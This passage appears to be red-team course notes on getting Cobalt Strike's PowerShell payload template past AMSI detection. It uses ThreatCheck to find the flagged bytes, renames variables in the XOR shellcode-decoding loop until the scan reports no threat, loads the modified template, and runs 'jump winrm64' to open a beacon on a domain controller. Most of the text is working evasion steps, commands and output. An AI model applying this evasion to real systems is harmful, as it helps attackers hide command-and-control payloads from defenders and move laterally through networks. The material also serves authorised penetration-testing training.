The Resource Kit contains templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

```
PS C:\Tools\cobaltstrike\ResourceKit> ls

    Directory: C:\Tools\cobaltstrike\ResourceKit

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2019   9:15 PM            205 compress.ps1
-a----         8/2/2018   2:17 AM           2979 README.txt
-a----         6/9/2020   6:31 PM           4359 resources.cna
-a----         4/3/2018   8:02 PM            830 template.exe.hta
-a----         6/9/2020   6:27 PM           2732 template.hint.x64.ps1
-a----         6/9/2020   6:26 PM           2836 template.hint.x86.ps1
-a----         4/3/2018   8:02 PM            197 template.psh.hta
-a----         6/7/2017   3:26 PM            635 template.py
-a----        3/31/2018   7:23 PM           1017 template.vbs
-a----         6/9/2020   6:26 PM           2371 template.x64.ps1
-a----         6/9/2020   6:26 PM           2479 template.x86.ps1
-a----         6/7/2017   3:26 PM           3856 template.x86.vba
```
  

`template.x64.ps1` is the template used in `jump winrm64`, so let's focus on that.

```
If we just scan the template (without any Beacon shellcode even been there), ThreatCheck will show that it is indeed detected by AMSI.

C:\>Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -e AMSI -f Tools\cobaltstrike\ResourceKit\template.x64.ps1
[+] Target file size: 2371 bytes
[+] Analyzing...

[...snip...]

[!] Identified end of bad bytes at offset 0x703
00000000   6E 74 61 74 69 6F 6E 46  6C 61 67 73 28 27 52 75   ntationFlags('Ru
00000010   6E 74 69 6D 65 2C 20 4D  61 6E 61 67 65 64 27 29   ntime, Managed')
00000020   0A 0A 09 72 65 74 75 72  6E 20 24 76 61 72 5F 74   ···return $var_t
00000030   79 70 65 5F 62 75 69 6C  64 65 72 2E 43 72 65 61   ype_builder.Crea
00000040   74 65 54 79 70 65 28 29  0A 7D 0A 0A 49 66 20 28   teType()·}··If (
00000050   5B 49 6E 74 50 74 72 5D  3A 3A 73 69 7A 65 20 2D   [IntPtr]::size -
00000060   65 71 20 38 29 20 7B 0A  09 5B 42 79 74 65 5B 5D   eq 8) {··[Byte[]
00000070   5D 24 76 61 72 5F 63 6F  64 65 20 3D 20 5B 53 79   ]$var_code = [Sy
00000080   73 74 65 6D 2E 43 6F 6E  76 65 72 74 5D 3A 3A 46   stem.Convert]::F
00000090   72 6F 6D 42 61 73 65 36  34 53 74 72 69 6E 67 28   romBase64String(
000000A0   27 25 25 44 41 54 41 25  25 27 29 0A 0A 09 66 6F   '%%DATA%%')···fo
000000B0   72 20 28 24 78 20 3D 20  30 3B 20 24 78 20 2D 6C   r ($x = 0; $x -l
000000C0   74 20 24 76 61 72 5F 63  6F 64 65 2E 43 6F 75 6E   t $var_code.Coun
000000D0   74 3B 20 24 78 2B 2B 29  20 7B 0A 09 09 24 76 61   t; $x++) {···$va
000000E0   72 5F 63 6F 64 65 5B 24  78 5D 20 3D 20 24 76 61   r_code[$x] = $va
000000F0   72 5F 63 6F 64 65 5B 24  78 5D 20 2D 62 78 6F 72   r_code[$x] -bxor
```
  

This particular output seems to be complaining about the small block of code around lines 26-28.

```
for ($x = 0; $x -lt $var_code.Count; $x++) {
  $var_code[$x] = $var_code[$x] -bxor 35
}
```

Using a simple Find & Replace for `$x` -> `$i` and `$var_code` -> `$var_banana` seems to be enough:

```
for ($i = 0; $i -lt $var_banana.Count; $i++) {
  $var_banana[$i] = $var_banana[$i] -bxor 35
}
```

```
C:\>Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -e AMSI -f Tools\cobaltstrike\ResourceKit\template.x64.ps1
[+] No threat found!
[*] Run time: 0.19s
```

Load `resources.cna` (in the `ResourceKit` folder) via **Cobalt Strike > Script Manager** to enable the use of the modified template. And now `jump winrm64` works.

```
beacon> jump winrm64 dc-2 smb
[+] established link to child beacon: 10.10.17.71
```